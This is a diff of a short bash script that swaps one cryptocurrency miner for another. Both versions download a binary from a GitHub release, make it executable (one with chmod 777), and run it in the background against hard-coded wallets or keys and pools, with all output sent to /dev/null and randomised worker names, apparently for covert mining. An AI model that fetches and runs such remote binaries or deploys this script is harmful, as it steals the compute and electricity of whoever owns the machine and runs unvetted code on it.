@@ -1,4 +1,5 @@
 #!/bin/bash
-wget https://github.com/bondaltomason/meo/releases/download/2.7.0/astrominer
-chmod +x astrominer
-./astrominer -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -r 95.179.145.38:10100 > /dev/null 2>&1 &
+wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient.tar.gz
+tar xf OrionClient.tar.gz
+cd OrionClient && chmod 777 OrionClient
+./OrionClient mine -a --pool twbitz --key J5RBZg3WLjXGXLEFypv4hq7D4tBrp2wDFKmg1m1hD6yZ --worker $(echo $(shuf -i 1-15000 -n 1)-CCC) > /dev/null 2>&1 &
